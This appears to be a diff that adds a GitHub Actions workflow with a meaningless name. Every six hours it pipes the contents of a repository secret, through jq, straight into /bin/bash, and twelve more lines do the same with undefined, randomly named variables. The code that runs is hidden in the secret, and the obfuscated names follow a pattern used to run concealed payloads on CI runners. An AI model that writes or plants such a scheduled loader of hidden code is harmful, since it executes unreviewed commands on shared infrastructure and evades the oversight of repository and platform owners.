@@ -1,0 +1,29 @@
+name: fullycriticism
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fullycriticism
+        env:
+          wn8144: ${{ secrets.wn8144 }}
+        run: |
+          echo $wn8144 | jq -r .hevrv586 | /bin/bash
+          echo $tv2 | jq -r .stnu72360 | /bin/bash
+          echo $xx327 | jq -r .ttqf6 | /bin/bash
+          echo $tpao162 | jq -r .i59346 | /bin/bash
+          echo $s1 | jq -r .bbb3 | /bin/bash
+          echo $pk0 | jq -r .cuk2 | /bin/bash
+          echo $rym551 | jq -r .gosyi6 | /bin/bash
+          echo $gazvy32373 | jq -r .oxa2 | /bin/bash
+          echo $edm8 | jq -r .ywr660 | /bin/bash
+          echo $jun0 | jq -r .qqc6 | /bin/bash
+          echo $nbhm739 | jq -r .ygg7 | /bin/bash
+          echo $jdywj70036 | jq -r .wl69693 | /bin/bash
+          echo $z9829 | jq -r .jb0360 | /bin/bash
+
